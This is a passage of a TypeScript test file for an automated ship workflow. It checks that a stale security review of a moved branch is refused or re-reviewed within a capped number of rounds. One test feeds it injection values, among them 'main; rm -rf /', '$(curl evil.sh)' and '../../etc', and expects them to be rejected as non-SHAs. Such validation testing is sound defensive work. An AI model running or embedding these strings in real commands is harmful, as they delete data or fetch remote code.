      await runDecisionBlock(decisionScope([], { tested: SHA, head: SHA.slice(0, 7) })),
    ).toBeUndefined();
  });

  test("the staleness refusal uses the same return path as the verdict refusal", async () => {
    const stale = await runDecisionBlock(decisionScope([], { tested: SHA, head: OTHER_SHA }));
    const failed = await runDecisionBlock(
      decisionScope([], {
        securityVerdict: { spawned: true, verdict: "FAIL", failures: ["guard bypass"] },
      }),
    );
    expect(Object.keys(stale!).sort(), "the two refusals return different shapes").toEqual(
      Object.keys(failed!).sort(),
    );
    expect(stale!.status).toBe(failed!.status);
  });

  test("the mismatch is not downgraded to a logged warning", () => {
    // AC-2. The shape this must not have: `securityVerdict.verdict === 'PASS'
    // ? log(...) : ...` — a ternary that turns the comparison into a note in
    // the transcript. Asserted over the whole file, not the block, because
    // moving it one line outside the markers would be the same bug.
    expect(
      shipSource.match(/securityVerdict\.verdict\s*===\s*'PASS'\s*\?/g) || [],
      "ship.js downgrades the security decision through a ternary",
    ).toEqual([]);
  });

  test("the staleness check runs before the PR step", () => {
    // Same structural guard as AC-1's: the PR step is far below and cannot be
    // stubbed into the extracted block, so assert the refusal comes first in
    // the file.
    const refusal = shipSource.indexOf("SECURITY_REVIEW_STALE");
    const prStep = shipSource.indexOf("record-env-and-pr");
    expect(refusal, "ship.js has no SECURITY_REVIEW_STALE refusal").toBeGreaterThan(-1);
    expect(prStep).toBeGreaterThan(-1);
    expect(refusal, "the staleness check happens after the PR is opened").toBeLessThan(prStep);
  });

  test("the head commit is re-read from git, not reused from the commit step", () => {
    // AC-1's "re-reads". The commit step's reply is the value that was already
    // stale on #164 — the point of this change is a second look at the branch
    // taken beside the decision, after the remediation rounds have run.
    const probe = shipSource.slice(
      shipSource.indexOf("// ──── REVIEW-CURRENCY-PROBE-START ────"),
      shipSource.indexOf("// ──── REVIEW-CURRENCY-PROBE-END ────"),
    );
    expect(probe, "ship.js has no review-currency probe").not.toBe("");
    expect(probe).toContain("git rev-parse HEAD");
    expect(probe, "the probe does not read the recorded review SHA back").toContain("testedSha");
    expect(probe).toContain("workflow-state.json");
    const required = probe.match(/required:\s*\[([^\]]*)\]/)?.[1] ?? "";
    expect(required, `the probe's required fields were: ${required}`).toContain("headSha");
  });
});

// ── #169 Ship round ─────────────────────────────────────────────────────

/**
 * Run the Ship-round refusal over a run whose ship-gate remediation has just
 * recommitted.
 *
 * `tested` is `agents.rook.testedSha` — the commit the review read, captured
 * before the Ship phase. `commitSha` is what `recommit-ship` reports the branch
 * now ends at. The default pair is the same commit, so a test about a mismatch
 * sets only the mismatch.
 */
function shipRoundScope(
  logs: string[],
  overrides: { tested?: unknown; commitSha?: unknown } & Record<string, unknown> = {},
): Record<string, unknown> {
  const tested = "tested" in overrides ? overrides.tested : SHA;
  const commitSha = "commitSha" in overrides ? overrides.commitSha : SHA;
  const rest = { ...overrides };
  delete rest.tested;
  delete rest.commitSha;
  return {
    log: (m: unknown) => logs.push(String(m)),
    reviewIsCurrent: inlinedReviewIsCurrent,
    securityVerdict: { spawned: true, verdict: "PASS", failures: [] as string[] },
    shipBranch: "169-deep-modules",
    ISSUE: 169,
    SLUG: "pai-harness-169",
    WORK_DIR: "/tmp/work",
    testedSha: tested,
    reCommit: { commitSha, parentSha: SHA, stateRecorded: true },
    ...rest,
  };
}

describe("#169 ship round: the review is checked again after recommit-ship", () => {
  test("the ship round moves the branch past the review", async () => {
    // The #164 artefact, one phase later: the review read 3fe336f1, the ship
    // gate's BUILD regression then committed and pushed, and nothing looked
    // again. Everything else about this run is fine — the only defect is that
    // the PASS describes code the branch no longer carries.
    const logs: string[] = [];
    const out = await runMarkedBlock(
      STALE_REFUSAL_BLOCK,
      shipRoundScope(logs, { tested: "3fe336f1", commitSha: OTHER_SHA }),
    );
    expect(out?.status, "a ship-round remediation reached Prove on a stale review").toBe(
      "SHIP_FAILED",
    );
    expect(String(out?.reason)).toStartWith("SECURITY_REVIEW_STALE");
    expect(String(out?.reason)).toContain("3fe336f1");
    expect(String(out?.reason)).toContain(OTHER_SHA);
    expect(out?.issue).toBe(169);
    expect(out?.slug).toBe("pai-harness-169");
    expect(logs.some(l => /SECURITY_REVIEW_STALE/.test(l)), "the refusal was never logged").toBe(
      true,
    );
  });

  test("a ship round that changes nothing still ships", async () => {
    // The positive control, and the reason the test above is worth anything: a
    // block that refused every Ship round would satisfy every assertion there.
    // A regression round that healed ceremony without committing leaves the tip
    // where the review found it, and that run is still shippable.
    expect(
      await runMarkedBlock(STALE_REFUSAL_BLOCK, shipRoundScope([])),
      "a ship round that moved nothing was refused — the check refuses everything",
    ).toBeUndefined();
    // Abbreviation is the same commit in either direction: testedSha arrives
    // through an agent and the recommit step reports whatever git printed.
    expect(
      await runMarkedBlock(STALE_REFUSAL_BLOCK, shipRoundScope([], { commitSha: SHA.slice(0, 7) })),
    ).toBeUndefined();
    expect(
      await runMarkedBlock(STALE_REFUSAL_BLOCK, shipRoundScope([], { tested: SHA.slice(0, 7) })),
    ).toBeUndefined();
  });

  test("an unreadable post-round commit is stale, not waved through", async () => {
    for (const commitSha of [undefined, null, "", "HEAD", {}, []]) {
      const out = await runMarkedBlock(STALE_REFUSAL_BLOCK, shipRoundScope([], { commitSha }));
      expect(
        out?.status,
        `recommit-ship reported commitSha=${JSON.stringify(commitSha)} and the run carried on`,
      ).toBe("SHIP_FAILED");
      expect(String(out?.reason)).toStartWith("SECURITY_REVIEW_STALE");
    }
  });

  test("a missing testedSha is stale here too", async () => {
    for (const tested of [undefined, null, "", "HEAD"]) {
      const out = await runMarkedBlock(STALE_REFUSAL_BLOCK, shipRoundScope([], { tested }));
      expect(out?.status, `testedSha=${JSON.stringify(tested)} was waved through`).toBe(
        "SHIP_FAILED",
      );
    }
  });

  test("the refusal returns the same shape as the Verify-side one", async () => {
    const shipRound = await runMarkedBlock(
      STALE_REFUSAL_BLOCK,
      shipRoundScope([], { commitSha: OTHER_SHA }),
    );
    const verifySide = await runDecisionBlock(decisionScope([], { tested: SHA, head: OTHER_SHA }));
    expect(
      Object.keys(shipRound!).sort(),
      "the two staleness refusals return different shapes",
    ).toEqual(Object.keys(verifySide!).sort());
    expect(shipRound!.status).toBe(verifySide!.status);
  });

  test("the block sits after recommit-ship and ahead of Prove", () => {
    // AC-1 is positional and the surrounding steps cannot be stubbed into an
    // extracted block, so it is asserted over the file. The Verify-side check
    // is upstream of `recommit-ship`; this one has to be downstream of it, or
    // it is the first check again under a second name.
    const recommitShip = shipSource.indexOf("label: 'recommit-ship'");
    const refusal = shipSource.indexOf(STALE_REFUSAL_START);
    const prove = shipSource.indexOf("PHASE 9: PROVE");
    expect(recommitShip, "ship.js has no recommit-ship step").toBeGreaterThan(-1);
    expect(refusal, "ship.js has no STALE-REFUSAL block").toBeGreaterThan(-1);
    expect(prove, "ship.js has no Prove phase").toBeGreaterThan(-1);
    expect(refusal, "the second currency check runs before the ship round commits").toBeGreaterThan(
      recommitShip,
    );
    expect(refusal, "the second currency check runs after Prove has already labelled the issue")
      .toBeLessThan(prove);
    expect(STALE_REFUSAL_BLOCK).toContain("SECURITY_REVIEW_STALE");
    expect(STALE_REFUSAL_BLOCK).toContain("status: 'SHIP_FAILED'");
  });

  test("no branch logs a currency mismatch and lets the run continue", () => {
    // AC-2, asserted over the whole file rather than the block: the cheap
    // version of this change is `currency.current ? proceed : log(...)`, and
    // writing it one line outside the markers would be the same defect. #129
    // was exactly a verdict that reached the transcript and nothing else.
    expect(
      shipSource.match(/[Cc]urrency\.current\s*\?/g) || [],
      "ship.js turns a currency mismatch into a ternary instead of a refusal",
    ).toEqual([]);
    const refusals = shipSource.match(/SECURITY_REVIEW_STALE/g) || [];
    expect(refusals.length, "one of the two staleness checks is missing").toBeGreaterThanOrEqual(2);
    for (const marker of [STALE_REFUSAL_START, STALE_REFUSAL_END]) {
      expect(
        (shipSource.match(new RegExp(marker.replace(/[|\\{}()[\]^$+*?.]/g, "\\$&"), "g")) || [])
          .length,
        `${marker} appears more than once, so the extracted block is ambiguous`,
      ).toBe(1);
    }
  });
});

describe("#169 parity: the inlined copy matches lib/security-verdict.ts", () => {
  // Same reasoning as the rookGateVerdict agreement test above, and the same
  // history: computeACHash's extracted function had never matched its inlined
  // copy, because nothing compared them.

  for (const [label, tested, head] of CURRENCY_MATRIX) {
    test(`agrees on ${label}`, () => {
      expect(inlinedReviewIsCurrent(tested, head), `drift at ${label}`).toEqual(
        reviewIsCurrent(tested, head),
      );
    });
  }

  test("the reasons agree word for word, not just the verdicts", () => {
    // A copy that refuses for the same inputs with a different explanation is
    // still drift, and it is the kind that reaches an operator rather than a
    // test.
    for (const [, tested, head] of CURRENCY_MATRIX) {
      expect(inlinedReviewIsCurrent(tested, head).reason).toBe(reviewIsCurrent(tested, head).reason);
    }
  });

  test("the library exports it exactly once, beside the other two", () => {
    // AC-3: declared in the library rather than living only in the workflow,
    // which is what makes the comparison above possible at all.
    const lib = readFileSync(join(REPO_ROOT, "lib", "security-verdict.ts"), "utf-8");
    expect((lib.match(/export function reviewIsCurrent/g) || []).length).toBe(1);
    expect(lib).toContain("export function rookGateVerdict");
    expect(lib).toContain("export function rookReviewSha");
  });
});

// ── #171 the decision: re-review the new tip, or run out of attempts ────

/**
 * #171 — #169 stopped the run; this decides whether the stop is worth one more
 * review.
 *
 * Run `wf_6fbfa028-14e` on #239 spent 87.7 minutes and 1,287,510 subagent
 * tokens across 22 agents and merged nothing. Rook returned PASS with no
 * findings, and the run died at SHIP because the verify gate's self-heal loop
 * committed 00f21e21 — 7 files, 992 insertions, `workflows/ship.js` among them
 * — after the review had been pinned to c5ebc2a4. The self-heal loop fires
 * whenever the first verify attempt leaves anything to fix, so the refusal had
 * made the common path the failing one.
 *
 * The matrix below is driven over the library AND over ship.js's inlined copy,
 * the same way the #169 currency matrix is, so "the two agree" cannot be
 * satisfied by the two being asked different questions.
 */
const STALE_CURRENCY = reviewIsCurrent(SHA, OTHER_SHA);
const CURRENT_CURRENCY = reviewIsCurrent(SHA, SHA);

const REREVIEW_MATRIX: Array<[string, unknown, unknown, unknown, ReReviewDecision]> = [
  ["a current review, nothing spent", CURRENT_CURRENCY, 0, 2, REVIEW_CURRENT],
  ["a current review with the cap already spent", CURRENT_CURRENCY, 2, 2, REVIEW_CURRENT],
  ["a stale review with the whole budget left", STALE_CURRENCY, 0, 2, RE_REVIEW],
  ["a stale review on the last round", STALE_CURRENCY, 1, 2, RE_REVIEW],
  ["a stale review with the cap spent", STALE_CURRENCY, 2, 2, SECURITY_REREVIEW_EXHAUSTED],
  ["a stale review past the cap", STALE_CURRENCY, 3, 2, SECURITY_REREVIEW_EXHAUSTED],
  ["a cap of zero", STALE_CURRENCY, 0, 0, SECURITY_REREVIEW_EXHAUSTED],
  // Fail-closed inputs. Every one of these is the absence of a reading that
  // says a round may be spent, and absence is not permission.
  ["no currency at all", undefined, 0, 2, SECURITY_REREVIEW_EXHAUSTED],
  ["a null currency", null, 0, 2, SECURITY_REREVIEW_EXHAUSTED],
  ["a currency that is a string", "CURRENT", 0, 2, SECURITY_REREVIEW_EXHAUSTED],
  ["a currency that is an array", [], 0, 2, SECURITY_REREVIEW_EXHAUSTED],
  ["a currency with no verdict", {}, 0, 2, SECURITY_REREVIEW_EXHAUSTED],
  ["a currency whose verdict is a string", { current: "yes" }, 0, 2, SECURITY_REREVIEW_EXHAUSTED],
  // The two self-contradictory shapes: "current, and here is why it is not",
  // and "stale, with no reason". Reading either as one of the two things it
  // says is picking at random.
  [
    "current with a reason attached",
    { current: true, reason: "the branch moved" },
    0,
    2,
    SECURITY_REREVIEW_EXHAUSTED,
  ],
  ["stale with no reason", { current: false }, 0, 2, SECURITY_REREVIEW_EXHAUSTED],
  ["stale with a blank reason", { current: false, reason: "   " }, 0, 2, SECURITY_REREVIEW_EXHAUSTED],
  ["an unreadable spent count", STALE_CURRENCY, undefined, 2, SECURITY_REREVIEW_EXHAUSTED],
  ["a fractional spent count", STALE_CURRENCY, 1.5, 2, SECURITY_REREVIEW_EXHAUSTED],
  ["a negative spent count", STALE_CURRENCY, -1, 2, SECURITY_REREVIEW_EXHAUSTED],
  ["NaN rounds", STALE_CURRENCY, NaN, 2, SECURITY_REREVIEW_EXHAUSTED],
  ["an infinite cap", STALE_CURRENCY, 0, Infinity, SECURITY_REREVIEW_EXHAUSTED],
  ["a cap that is a string", STALE_CURRENCY, 0, "2", SECURITY_REREVIEW_EXHAUSTED],
  ["an absent cap", STALE_CURRENCY, 0, undefined, SECURITY_REREVIEW_EXHAUSTED],
];

describe("#171 reReviewDecision: the stale review is re-run while a round remains", () => {
  for (const [label, currency, spent, cap, expected] of REREVIEW_MATRIX) {
    test(`${label} → ${expected}`, () => {
      const out = reReviewDecision(currency, spent, cap);
      expect(out.decision, `${label}: the library decided ${out.decision}`).toBe(expected);
      if (expected === REVIEW_CURRENT) {
        expect(out.reason, `${label}: a current review carried a reason`).toBeNull();
      } else {
        expect(typeof out.reason, `${label}: ${expected} carried no reason`).toBe("string");
        expect(out.reason!.trim().length).toBeGreaterThan(0);
      }
    });
  }

  test("the three verdicts are three different words", () => {
    // A decision whose members collapse is a decision the caller cannot act
    // on differently, which is the whole of AC-3: exhaustion must be readable
    // as neither of its neighbours.
    expect(new Set([REVIEW_CURRENT, RE_REVIEW, SECURITY_REREVIEW_EXHAUSTED]).size).toBe(3);
  });

  test("the re-review reason is the staleness reason, so it names both commits", () => {
    const out = reReviewDecision(STALE_CURRENCY, 0, 2);
    expect(out.reason).toBe(STALE_CURRENCY.reason);
    expect(out.reason).toContain(SHA);
    expect(out.reason).toContain(OTHER_SHA.toLowerCase());
  });

  test("the exhaustion reason says how many rounds were spent against what cap", () => {
    const out = reReviewDecision(STALE_CURRENCY, 2, 2);
    expect(out.decision).toBe(SECURITY_REREVIEW_EXHAUSTED);
    expect(out.reason).toContain("2");
    expect(out.reason, "the refusal does not say the attempts ran out").toMatch(
      /ran out of attempts/i,
    );
    // It still says WHY the review was not current, or the refusal names a
    // budget without naming the problem the budget was being spent on.
    expect(out.reason).toContain(OTHER_SHA.toLowerCase());
  });

  test("nothing throws — a throw here is a refusal the caller can swallow", () => {
    const hostile = new Proxy(
      {},
      {
        get() {
          throw new Error("hostile currency");
        },
      },
    );
    for (const bad of [hostile, Symbol.iterator, () => {}, new Date(), NaN]) {
      expect(() => reReviewDecision(bad as unknown, 0, 2)).not.toThrow();
      expect(() => reReviewDecision(STALE_CURRENCY, bad as unknown, bad as unknown)).not.toThrow();
    }
  });

  test("the exhaustion refusal is spelled once in the library", () => {
    // A second spelling is a second refusal path, reachable by code the first
    // one's tests never visit — which is how a refusal comes to exist that
    // nothing has ever proved can fire.
    const lib = readFileSync(join(REPO_ROOT, "lib", "security-verdict.ts"), "utf-8");
    const literals = lib.match(/"SECURITY_REREVIEW_EXHAUSTED"/g) || [];
    expect(literals.length, "the exhaustion name is written as a string literal more than once").toBe(1);
    expect((lib.match(/export const SECURITY_REREVIEW_EXHAUSTED/g) || []).length).toBe(1);
    expect((lib.match(/export function reReviewDecision/g) || []).length).toBe(1);
  });
});

describe("#171 the re-review's scope is the remediation diff", () => {
  test("the reviewed commit becomes --base and the new tip becomes --sha", () => {
    // AC-2. Without the base the second review re-reads the whole branch,
    // which is both slower and worse: the finding that matters is in the
    // commit the self-heal loop just wrote.
    const cmd = rookScopeCommand("/p", "/h", OTHER_SHA, "/w/scope-2.json", SHA);
    expect(cmd).toContain(`--sha ${OTHER_SHA.toLowerCase()}`);
    expect(cmd).toContain(`--base ${SHA}`);
  });

  test("no base at all leaves the script's origin/main default in place", () => {
    for (const none of [undefined, null, ""]) {
      const cmd = rookScopeCommand("/p", "/h", SHA, "/w/s.json", none as unknown as string);
      expect(cmd, `${JSON.stringify(none)} produced a --base flag`).not.toContain("--base");
    }
  });

  test("a base that is not a commit SHA is refused rather than quoted", () => {
    // Same argument as the --sha refusal: a value that needs quoting here is
    // not a commit, and three consecutive security reviews of this area each
    // found a hole in a filter that sanitised instead of refusing.
    for (const bad of ["HEAD", "origin/main", "main; rm -rf /", "$(curl evil.sh)", "../../etc"]) {
      expect(() =>
        rookScopeCommand("/p", "/h", SHA, "/w/s.json", bad),
      ).toThrow(/not a commit SHA/i);
    }
  });
});

// ── #171 the decision block re-reviews instead of dying ─────────────────

/** A third commit: the tip a second remediation round leaves behind. */
const THIRD_SHA = "7c1d9e0ab2f3456789abcdef0123456789abcdef";

const SPAWN_START = "// ──── ROOK-REVIEW-SPAWN-START ────";
const SPAWN_END = "// ──── ROOK-REVIEW-SPAWN-END ────";

/**
 * ship.js's security-review spawn, extracted by marker and compiled with
 * stubs, so a round can be requested with arbitrary arguments.
 *
 * The fan-out harness below cannot do this: it calls the block, and the block
 * calls `runRookReview()` for the first review only. What AC-2 is about is the
 * SECOND call's arguments, so the function is reached directly — the same way
 * every other block in this file is reached — rather than through a stub that
 * could agree with a prompt production never builds.
 */
function buildReviewSpawn(opts: { rook?: unknown; scope?: unknown } = {}) {
  const labels: string[] = [];
  const prompts: string[] = [];
  const logs: string[] = [];
  const factory = new Function(
    "log", "timedAgent", "briefedAgent", "PROJECT_ROOT", "HARNESS_ROOT", "WORK_DIR",
    "ISSUE", "GATE_RESULT_SCHEMA", "reviewSha", "rookScopeCommand", "rookGateVerdict",
    "shellQuote",
    `let securityVerdict = { spawned: false, verdict: 'FAIL', failures: ['the security review did not run'] }
${sliceBlock(SPAWN_START, SPAWN_END)}
return { runRookReview, recordExhaustedSecurityReview }`,
  );
  const record = (label: string, prompt: string) => {
    labels.push(label);
    prompts.push(prompt);
  };
  const mod = factory(
    (m: unknown) => logs.push(String(m)),
    async (p: string, o: { label: string }) => {
      record(o.label, p);
      return o.label === "rook-scope" ? (opts.scope ?? GOOD_SCOPE) : { ok: true };
    },
    async (p: string, o: { label: string }) => {
      record(o.label, p);
      return opts.rook ?? { result: "PASS" };
    },
    REPO_ROOT, REPO_ROOT, "/tmp/work", 171, {},
    SHA, inlined.rookScopeCommand, inlined.rookGateVerdict, shellQuote,
  ) as {
    runRookReview: (o?: unknown) => Promise<{ verdict: unknown; testedSha: unknown } | undefined>;
    recordExhaustedSecurityReview: (rounds: number) => Promise<void>;
  };
  return {
    mod,
    labels,
    prompts,
    logs,
    promptFor(label: string) {
      const i = labels.indexOf(label);
      return i === -1 ? "" : prompts[i];
    },
  };
}

async function runReviewSpawn(round?: { sha: string; base: string; round: number }) {
  const harness = buildReviewSpawn();
  const returned = await harness.mod.runRookReview(round);
  return { ...harness, returned };
}

interface ReReviewCall {
  sha: unknown;
  base: unknown;
  round: unknown;
}

/**
 * Drive the decision block over a run whose branch has moved past the review.
 *
 * `spawn` decides what each re-review round returns, so a test can make the
 * second review pass, fail, pin itself to the wrong commit, or return nothing
 * at all. Every call is recorded, which is how AC-2 is checked: the scope the
 * second review is given is an argument this harness can read, not a string in
 * a prompt nobody runs.
 */
function reReviewRun(opts: {
  tested?: unknown;
  head?: unknown;
  budget?: unknown;
  spawn?: (call: ReReviewCall, n: number) => unknown;
  overrides?: Record<string, unknown>;
}) {
  const logs: string[] = [];
  const calls: ReReviewCall[] = [];
  const exhaustionRecorded: number[] = [];
  const head = "head" in opts ? opts.head : OTHER_SHA;
  const spawn =
    opts.spawn ??
    ((call: ReReviewCall) => ({
      verdict: { spawned: true, verdict: "PASS", failures: [] as string[] },
      testedSha: call.sha,
    }));

  const scope = decisionScope(logs, {
    tested: "tested" in opts ? opts.tested : SHA,
    head,
    MAX_SECURITY_REREVIEWS: "budget" in opts ? opts.budget : 2,
    runRookReview: async (call: ReReviewCall) => {
      calls.push(call);
      return spawn(call, calls.length);
    },
    recordExhaustedSecurityReview: async (rounds: number) => {
      exhaustionRecorded.push(rounds);
    },
    ...(opts.overrides ?? {}),
  });
  const result = runMarkedBlock(sliceBlock(DECISION_START, DECISION_END), scope);
  return { result, logs, calls, exhaustionRecorded, scope };
}

describe("#171 AC-1: a remediation commit is re-reviewed, not fatal", () => {
  test("the run continues to the PR step on the re-review's PASS", async () => {
    // The wf_6fbfa028-14e shape: rook passed c5ebc2a4, the self-heal loop then
    // committed 00f21e21, and the run died at SHIP having merged nothing. The
    // block must now spawn a second review of the new tip and fall through.
    const run = reReviewRun({ tested: "c5ebc2a4", head: OTHER_SHA });
    expect(
      await run.result,
      "a remediation commit still ended the run instead of being re-reviewed",
    ).toBeUndefined();
    expect(run.calls.length, "no re-review was spawned").toBe(1);
    expect(run.exhaustionRecorded, "an exhaustion was recorded for a run that re-reviewed").toEqual([]);
  });

  test("the re-review is announced, with the round and the cap", async () => {
    const run = reReviewRun({});
    await run.result;
    const line = run.logs.find(l => /re-review/i.test(l) && /round/i.test(l));
    expect(line, `nothing in the log says a re-review happened: ${run.logs.join(" | ")}`).toBeDefined();
    expect(line).toContain("1");
    expect(line).toContain("2");
  });

  test("the positive control: a current review spawns nothing at all", async () => {
    // Without this, a block that re-reviewed unconditionally would satisfy
    // every assertion above — and would spend a rook on every passing run.
    const run = reReviewRun({ tested: SHA, head: SHA });
    expect(await run.result).toBeUndefined();
    expect(run.calls, "a current review was re-reviewed anyway").toEqual([]);
  });

  test("a re-review that FAILs stops the run on the verdict path", async () => {
    const run = reReviewRun({
      spawn: () => ({
        verdict: { spawned: true, verdict: "FAIL", failures: ["a reproduced guard bypass"] },
        testedSha: OTHER_SHA,
      }),
    });
    const out = await run.result;
    expect(out?.status, "a failing re-review reached the PR step").toBe("SHIP_FAILED");
    expect(String(out?.reason)).toContain("a reproduced guard bypass");
    expect((out?.security as { verdict: string }).verdict).toBe("FAIL");
  });

  test("a re-review that returns nothing is a FAIL, not a fall-through", async () => {
    // The agent-returned-undefined case. Absence of evidence is not evidence
    // of absence on the path that decides whether a run may ship.
    for (const nothing of [undefined, null, {}, "PASS", { verdict: null }]) {
      const run = reReviewRun({ spawn: () => nothing });
      const out = await run.result;
      expect(
        out?.status,
        `a re-review returning ${JSON.stringify(nothing)} let the run continue`,
      ).toBe("SHIP_FAILED");
    }
  });

  test("a second remediation round inside the cap is re-reviewed again", async () => {
    // Round 1 passes but pins itself to a commit that is still behind the tip
    // — which is what a round that reviewed while the branch moved again looks
    // like. The loop must spend its second round rather than refuse.
    let n = 0;
    const run = reReviewRun({
      head: THIRD_SHA,
      spawn: call => {
        n++;
        return {
          verdict: { spawned: true, verdict: "PASS", failures: [] as string[] },
          testedSha: n === 1 ? OTHER_SHA : call.sha,
        };
      },
    });
    expect(await run.result).toBeUndefined();
    expect(run.calls.length, "the second round was never spent").toBe(2);
  });
});

describe("#171 AC-2: the second review reads the remediation diff", () => {
  test("the reviewed commit is the base and the new tip is the subject", async () => {
    const run = reReviewRun({ tested: SHA, head: OTHER_SHA });
    await run.result;
    expect(run.calls[0].base, "the re-review was not based on the reviewed commit").toBe(SHA);
    expect(run.calls[0].sha, "the re-review was not aimed at the new tip").toBe(
      OTHER_SHA.toLowerCase(),
    );
    expect(run.calls[0].round).toBe(1);
  });

  test("the second round bases on what the first round reviewed, not the original", async () => {
    let n = 0;
    const run = reReviewRun({
      head: THIRD_SHA,
      spawn: call => {
        n++;
        return {
          verdict: { spawned: true, verdict: "PASS", failures: [] as string[] },
          testedSha: n === 1 ? OTHER_SHA : call.sha,
        };
      },
    });
    await run.result;
    expect(run.calls[1].base, "round 2 re-read ground round 1 had already covered").toBe(OTHER_SHA);
    expect(run.calls[1].round).toBe(2);
  });

  test("the spawn builds a --base scope command and names the commit in the prompt", async () => {
    // The argument is only half of AC-2; the other half is that runRookReview
    // turns it into a scope narrowed to those two commits, and tells the
    // reviewer which commit it is reading. Asserted over the real spawn,
    // extracted from ship.js and executed, not over a stub.
    const round = await runReviewSpawn({ sha: OTHER_SHA, base: SHA, round: 1 });
    const scopePrompt = round.promptFor("rook-scope");
    expect(scopePrompt).toContain(`--sha ${OTHER_SHA.toLowerCase()}`);
    expect(scopePrompt, "the re-review's scope is not narrowed to the remediation diff").toContain(
      `--base ${SHA}`,
    );
    const rookPrompt = round.promptFor("rook");
    expect(rookPrompt, "the reviewer is not told which commit it is re-reviewing").toContain(
      OTHER_SHA.toLowerCase(),
    );
    expect(rookPrompt).toContain(SHA);
    expect(rookPrompt).toMatch(/RE-REVIEW ROUND 1/);
  });

  test("the spawn reports the verdict and the commit it reviewed", async () => {
    // What the decision block reads back. A spawn that returned nothing would
    // make every re-review look like a failure, and one that returned the old
    // commit would loop until the cap.
    const round = await runReviewSpawn({ sha: OTHER_SHA, base: SHA, round: 1 });
    expect(round.returned?.testedSha).toBe(OTHER_SHA.toLowerCase());
    expect((round.returned?.verdict as { verdict: string }).verdict).toBe("PASS");
  });

  test("the first review still has no --base, so it reads the whole branch", async () => {
    const first = await runReviewSpawn();
    expect(
      first.promptFor("rook-scope"),
      "the first review was narrowed to a base nothing had reviewed",
    ).not.toContain("--base");
    expect(first.promptFor("rook"), "the first review announced itself as a re-review").not.toMatch(
      /RE-REVIEW ROUND/,
    );
  });

  test("each round writes its own scope and findings files", async () => {
    // A second review reading the first one's findings file would report
    // findings it never made — and a run that re-reviewed twice would leave
    // one artefact where it did two reviews.
    const paths = (ps: string[]) =>
      ps.join("\n").match(/rook-(?:scope|findings)[\w-]*\.json/g) || [];
    const first = await runReviewSpawn();
    const second = await runReviewSpawn({ sha: OTHER_SHA, base: SHA, round: 1 });
    expect(paths(first.prompts).length).toBeGreaterThan(0);
    expect(paths(second.prompts).length).toBeGreaterThan(0);
    for (const p of paths(first.prompts)) {
      expect(p, `the first review wrote ${p}, which belongs to a round`).not.toContain("-r");
    }
    for (const p of paths(second.prompts)) {
      expect(p, `round 1 wrote ${p}, the same file the first review used`).toContain("-r1");
    }
  });

  test("the round's verdict is recorded under its own label", async () => {
    const second = await runReviewSpawn({ sha: OTHER_SHA, base: SHA, round: 1 });
    expect(second.labels).toContain("record-security-r1");
    const first = await runReviewSpawn();
    expect(first.labels).toContain("record-security");
  });

  test("the exhaustion recorder writes EXHAUSTED with the round count", async () => {
    const spawn = buildReviewSpawn();
    await spawn.mod.recordExhaustedSecurityReview(3);
    const prompt = spawn.promptFor("record-security-exhausted");
    expect(prompt, "nothing records that the cycle ran out of attempts").not.toBe("");
    expect(prompt).toContain("--verdict EXHAUSTED");
    expect(prompt).toContain("--rounds");
    expect(prompt).toContain("3");
    expect(prompt, "an exhausted cycle handed the recorder a findings list").not.toContain(
      "--findings",
    );
  });
});

describe("#171 AC-3: the cycle is capped, and the cap is its own outcome", () => {
  test("a review that is still behind after every round refuses as exhausted", async () => {
    // The reviewer keeps reporting a commit the branch has already moved past
    // — the pathological remediation loop. The run must stop, and it must stop
    // saying which thing went wrong.
    const run = reReviewRun({ spawn: () => ({
      verdict: { spawned: true, verdict: "PASS", failures: [] as string[] },
      testedSha: SHA,
    }) });
    const out = await run.result;
    expect(out?.status).toBe("SHIP_FAILED");
    expect(String(out?.reason)).toStartWith(SECURITY_REREVIEW_EXHAUSTED);
    expect(run.calls.length, "the cap did not bound the loop").toBe(2);
  });

  test("the refusal is recorded in workflow-state with the round count", async () => {
    const run = reReviewRun({ spawn: () => ({
      verdict: { spawned: true, verdict: "PASS", failures: [] as string[] },
      testedSha: SHA,
    }) });
    await run.result;
    expect(
      run.exhaustionRecorded,
      "the run ended holding unreviewed code and the artefact does not say so",
    ).toEqual([2]);
  });

  test("the exhaustion refusal is not the staleness refusal", async () => {
    // AC-3's "distinguishably". A reader cannot act differently on two
    // refusals that say the same word.
    const exhausted = await reReviewRun({ spawn: () => ({
      verdict: { spawned: true, verdict: "PASS", failures: [] as string[] },
      testedSha: SHA,
    }) }).result;
    const stale = await runDecisionBlock(decisionScope([], { tested: SHA, head: OTHER_SHA }));
    expect(String(exhausted?.reason)).not.toStartWith("SECURITY_REVIEW_STALE");
    expect(String(stale?.reason)).toStartWith("SECURITY_REVIEW_STALE");
    expect(String(stale?.reason)).not.toContain(SECURITY_REREVIEW_EXHAUSTED);
  });

  test("a smaller cap spends fewer rounds, so the number is the bound", async () => {
    for (const budget of [1, 2, 3]) {
      const run = reReviewRun({
        budget,
        spawn: () => ({
          verdict: { spawned: true, verdict: "PASS", failures: [] as string[] },
          testedSha: SHA,
        }),
      });
      await run.result;
      expect(run.calls.length, `a cap of ${budget} spent ${run.calls.length} rounds`).toBe(budget);
      expect(run.exhaustionRecorded).toEqual([budget]);
    }
  });

  test("ship.js declares a cap bigger than zero", () => {
    // The harness above supplies the budget, so without this the production
    // value could be 0 — a re-review path that never runs — and every test in
    // this describe would still pass.
    const decl = shipSource.match(/const MAX_SECURITY_REREVIEWS\s*=\s*(\d+)/);
    expect(decl, "ship.js has no re-review cap").not.toBeNull();
    expect(Number(decl![1]), "the re-review cap is zero, so the path never runs").toBeGreaterThan(0);
    // Bounded above as well: a cap large enough to be effectively unlimited is
    // a cycle with no exhaustion outcome, and AC-3's refusal would be dead code.
    expect(
      Number(decl![1]),
      "the re-review cap is high enough that exhaustion is unreachable in practice",
    ).toBeLessThanOrEqual(3);
    expect(
      (shipSource.match(/const MAX_SECURITY_REREVIEWS\s*=/g) || []).length,
      "the cap is declared more than once",
    ).toBe(1);
  });
});

describe("#171 AC-4: the #169 detection half is preserved, not relaxed", () => {
  test("a stale review with no round available still refuses as STALE", async () => {
    // The #169 refusal, unchanged: nothing was re-reviewed, so the run ends on
    // the name #169 gave it rather than on the new one.
    const run = reReviewRun({ budget: 0 });
    const out = await run.result;
    expect(out?.status).toBe("SHIP_FAILED");
    expect(String(out?.reason)).toStartWith("SECURITY_REVIEW_STALE");
    expect(run.calls, "a run with no budget spawned a review anyway").toEqual([]);
    expect(
      run.exhaustionRecorded,
      "a run that spent no round recorded an exhausted cycle",
    ).toEqual([]);
  });

  test("an unreadable budget is stale, not an invitation to re-review", async () => {
